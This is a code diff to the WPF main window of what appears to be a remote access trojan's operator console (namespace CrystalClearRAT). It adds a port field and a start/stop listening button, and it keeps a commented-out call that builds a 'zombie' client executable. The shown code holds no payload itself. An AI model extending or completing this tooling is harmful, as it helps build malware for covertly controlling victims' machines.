@@ -40,6 +40,8 @@ namespace CrystalClearRAT
     /// </summary>
     public partial class MainWindow : MetroWindow
     {
+
+        bool listening;
         public MainWindow()
         {
             InitializeComponent();
@@ -61,7 +63,7 @@ namespace CrystalClearRAT
         private void Grid_Loaded(object sender, RoutedEventArgs e)
         {
             //  ZombieBuilder.Build(new ClientSettings("192.168.0.14", 1337), "zombieWithSettings.exe");
-            Server.Start(1337);
+         //   Server.Start(1337);
 
         }
 
@@ -109,6 +111,49 @@ namespace CrystalClearRAT
         private void BuildFileItem_Click(object sender, RoutedEventArgs e)
         {
             new BuilderWindow().Show();
+        }
+
+        private void TextBox_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            if (this.IsInitialized)
+            {
+                if (string.IsNullOrWhiteSpace(portTextBox.Text))
+                {
+                    listeningButton.IsEnabled = false;
+                }
+                else
+                {
+                    listeningButton.IsEnabled = true;
+                }
+            }
+        }
+
+        private void listeningButton_Click(object sender, RoutedEventArgs e)
+        {
+
+            if (listening)
+            {
+                listeningButton.Content = "Start Listening";
+                listening = false;
+                Server.Kill();
+            }
+            else
+            {
+
+                int port;
+
+                if (int.TryParse(portTextBox.Text, out port))
+                {
+                    listening = true;
+                    listeningButton.Content = "Stop Listening";
+                    Server.Start(port);
+                }
+
+                else
+                {
+                    MessageBox.Show("Error", "Port input is not valid", MessageBoxButton.OK, MessageBoxImage.Error);
+                }
+            }
         }
     }
 }
